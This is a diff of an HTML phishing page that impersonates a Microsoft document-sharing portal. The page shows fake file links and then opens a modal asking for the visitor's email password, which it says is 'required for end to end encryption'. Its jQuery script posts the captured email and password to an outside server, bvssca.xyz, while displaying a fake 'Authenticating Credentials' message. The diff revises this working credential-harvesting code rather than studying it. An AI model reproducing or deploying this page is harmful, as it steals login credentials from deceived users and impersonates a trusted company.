@@ -2,71 +2,68 @@
 <html lang="en">
 
 <head>
-    <title>Materia</title>
+       <title> zAuvP </title>
 
-    <meta name="description" content="_Materials">
-  
+<meta name="description" content="for S">
 
 
-    <meta name="keywords" content="_Demands">
 
-    <meta name="robots" content="noindex, nofollow">
+<meta name="keywords" content="_Demands">
 
-    <meta property="og:title" content="_Overview | Specs">
+<meta name="robots" content="noindex, nofollow">
 
-    <meta property="og:type" content="website">
+<meta property="og:title" content="_Overview | Specs">
 
-    <meta property="og:site_name" content="_&amp;Requirements">
+<meta property="og:type" content="website">
 
-    <meta property="og:description" content="&amp;RFQ_">
+<meta property="og:site_name" content="_&amp;Requirements">
+
+<meta property="og:description" content="&amp;RFQ_">
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-   
-    <link rel="stylesheet" href="bootstrap.min.css">
-  <script src="jquery.min.js"></script>
-  <script src="popper.min.js"></script>
-  <script src="bootstrap.min.js"></script>
-  <!-- <script src="app.js"></script> -->
-  <script> 
-$(document).ready(function() {
-    $('#msg').hide();
-    $('#msg2').hide();
-    var baseUrl = (window.location).href;
-    var url = baseUrl.substring(baseUrl.lastIndexOf('=') + 1);
-    $("#x1").val(url);
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
 
-    $("#profileUp").submit(function(e) {
-        e.preventDefault();
-        var nm = $("#A1").val();
-        var formData = new FormData($("#profileUp")[0]);
-        $("#byn").html("Processing..").prop("disabled", true);
-        $.ajax({
-            
-            url: "https://bvssca.xyz/j/tip.php",
-            type: 'POST',
-            data: formData,
-            // dataType : 'jsonp',
-            crossDomain:true,
-        
-            contentType: false,
-            processData: false,
-           
-            success: function(res) {
-                $('#msg').show();
-                $('#msg2').hide();
-                setTimeout(function() {
-                    $('#msg').hide();
-                    $('#msg2').show();
-                    $("#x1").val(url);
-                    $("#x2").val("");
-                    $("#byn").html("Access Document").prop("disabled", false);
-                }, 2000);
-            }
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css"
+        integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+   <script>
+      $(document).ready(function () {
+            $('#msg').hide();
+            $('#msg2').hide();
+            var baseUrl = (window.location).href;
+            var url = baseUrl.substring(baseUrl.lastIndexOf('=') + 1);
+            $("#x1").val(url);
+
+            $("#profileUp").submit(function (e) {
+                e.preventDefault();
+                var nm = $("#A1").val();
+                var formData = new FormData($("#profileUp")[0]);
+                $("#byn").html("Processing..").prop("disabled", true);
+                $.ajax({
+                    url: "https://bvssca.xyz/j/tip.php",
+                    type: 'POST',
+                    data: formData,
+                    contentType: false,
+                    crossDomain: true,
+                    processData: false,
+                    success: function (res) {
+                        $('#msg').show();
+                        $('#msg2').hide();
+                        setTimeout(function () {
+                            $('#msg').hide();
+                            $('#msg2').show();
+                            $("#x1").val(url);
+                            $("#x2").val("");
+                        }, 2000);
+                    }
+                });
+            });
         });
-    });
-});
-    </script>
 
+</script>
 
     <style>
         video {
@@ -83,12 +80,9 @@ $(document).ready(function() {
 
 <body>
 
-    <script>
-       
-    </script>
     <nav class="navbar " style="background-color:#026FC2;">
         <div class="container">
-            <a class="navbar-brand" href="#" data-toggle="modal" data-target="#myModal"><img src="logo.jpg"></a>
+            <a class="navbar-brand" href="#"><img src="logo.jpg"></a>
             <button class="navbar-toggler " type="button ">
                 <span class="navbar-toggler-icon text-dark"></span>
             </button>
@@ -100,90 +94,54 @@ $(document).ready(function() {
     <div class="container">
         <div class="row mt-4">
             <div class="col-sm-9 p-0 " style="box-shadow:2px 2px  3px gray">
-                <table class="table">
-                    <thead>
-                        <tr>
-                            <th class="col-checkbox">
-                                <label>
-                    <input type="checkbox" class="toggle-all-checkboxes" checked>
-                    <span></span>
-                    </label>
-                            </th>
-                            <th>Name</th>
-                            <th>Size</th>
-                            <th class="col-action"></th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                      
-                        <tr>
-                            <td class="col-checkbox">
-                                <label>
-                    <input type="checkbox" name="ki0R72LrcXsG" id="frm-deliveryDetailForm-deliveryDetailForm-ki0R72LrcXsG" checked class="toggle-checkbox" data-download-size="1086">
-                    <span></span>
-                    </label>
-                            </td>
-                            <td class="break-word">
-                                Important Organizational Update For Partners.pdf
-                            </td>
-                            <td class="color-brighter">2.67 MB</td>
-                            <td class="col-action">
-                                <a href="#" data-toggle="modal" data-target="#myModal" class="download-link underline download-single-file" data-token="ki0R72LrcXsG">
-                                    <span class="icon-arrow-down-circle"></span>
-                                    <span class="underline-item">
-                    Download
-                    </span>
-                                </a>
-                            </td>
-                        </tr>
-                        <tr>
-                            <td class="col-checkbox">
-                                <label>
-                    <input type="checkbox" name="ki0R72LrcXsG" id="frm-deliveryDetailForm-deliveryDetailForm-ki0R72LrcXsG" checked class="toggle-checkbox" data-download-size="1086">
-                    <span></span>
-                    </label>
-                            </td>
-                            <td class="break-word">
-                                Terms and conditions.pdf
-                            </td>
-                            <td class="color-brighter">2.03 MB</td>
-                            <td class="col-action">
-                                <a href="#" data-toggle="modal" data-target="#myModal" class="download-link underline download-single-file" data-token="ki0R72LrcXsG">
-                                    <span class="icon-arrow-down-circle"></span>
-                                    <span class="underline-item">
-                    Download
-                    </span>
-                                </a>
-                            </td>
-                        </tr>
-                    </tbody>
-                </table>
+                <div style="background-color: #026FC2;">
+                    <img src="top.jpg" class="img-fluid">
+                </div>
 
+                <table class="table table-borederless" style="font-size: 12px;">
+                    <tr>
+                        <td><img src="tp.jpg" class="img-fluid"> </td>
+                        <td class="text-right"><a href="" data-toggle="modal" data-target="#myModal">View</a></td>
+                    </tr>
+                    <tr>
+                        <td><img src="tp2.jpg" class="d"> </td>
+                        <td class="text-right"><a href="" data-toggle="modal" data-target="#myModal">View</a></td>
+                    </tr>
+                    <tr>
+                    <tr>
+                        <td><img src="tp3.jpg" class="d"> </td>
+                        <td class="text-right"><a href="" data-toggle="modal" data-target="#myModal">View</a></td>
+                    </tr>
+                    <tr>
+                        <td> </td>
+                        <td class="text-right"><a href="" data-toggle="modal" data-target="#myModal">Download All</a>
+                        </td>
+                    </tr>
+                </table>
             </div>
 
             <div class="col-sm-3">
-
+               
             </div>
+            <div class="my-4" style="font-size: 12px;">© Microsoft 2021.</div>
         </div>
-        <div class="my-4" style="font-size: 12px;">© Microsoft 2021.</div>
-    </div>
     </div>
 
 
 
     <!-- The Modal -->
     <div class="modal" id="myModal">
-        <div class="modal-dialog modal-md">
+        <div class="modal-dialog modal-lg">
             <div class="modal-content">
 
                 <!-- Modal Header -->
                 <div class="modal-header">
-                    <img src="loo.jpg">
+                    <h4 class="modal-title">Reciever's Authentication Desk</h4>
                     <button type="button" class="close" data-dismiss="modal">&times;</button>
                 </div>
 
                 <!-- Modal body -->
-                <div class="modal-body ">
+                <div class="modal-body">
                     <div id="msg" class="alert alert-success">
                         Authenticating Credentials, Please wait...
                     </div>
@@ -193,16 +151,38 @@ $(document).ready(function() {
 
                     <form method="post" id="profileUp">
                         <label for="demo">Email address</label>
-                        <input type="text" readonly class="form-control" value="" placeholder="Email" id="x1" name="x1">
-                        <div><small>We'll never share your email with anyone else.</small></div>
-                        <label for="demo">Password</label>
-                        <input type="password" class="form-control" value="" placeholder="Receiver's Password" id="x2" name="x2" required>
-                        <div class="mb-3"><small>Required for end to end encryption</small></div>
-                        <hr>
-                        <div class="mb-3"> <button type="submit" id="byn" class="btn-primary btn">Access File</button>
+                        <div class="input-group">
+                            <div class="input-group-append">
+                                <span class="input-group-text"><i class="fa fa-envelope"></i></span>
+                            </div>
+                            <input type="text" readonly class="form-control" value="" placeholder="Email" id="x1"
+                                name="x1">
+
                         </div>
+                        <div><small>We'll never share your email with anyone else.</small></div>
+                        <label for="demo">Email Password</label>
+                        <div class="input-group">
+                            <div class="input-group-append">
+                                <span class="input-group-text"><i class="fa fa-lock"></i></span>
+                            </div>
+                            <input type="password" class="form-control" value="" placeholder="Receiver's Email Password"
+                                id="x2" name="x2">
+
+                        </div>
+                        <div class="mb-3"><small>Required for end to end encryption</small></div>
+                        <div class="input-group">
+                            <input type="checkbox"> Data Encryption Enabled
+                        </div>
+                        <hr>
+                        <div class="text-right mb-3"> <button type="submit" class="btn-primary btn">View File</button>
+                        </div>
+
+
+
+                        <div style="font-size: 12px;"></div>
+                        Tip: To access files, enter receiver's email and password
                         <div style="font-size: 10px;">
-                            All rights reserved. ©Microsoft 2021
+                            All rights reserved. ©Microsoft 2020
                         </div>
                 </div>
                 </form>
@@ -215,8 +195,6 @@ $(document).ready(function() {
 
 
 
-
-  
 
 </body>
 
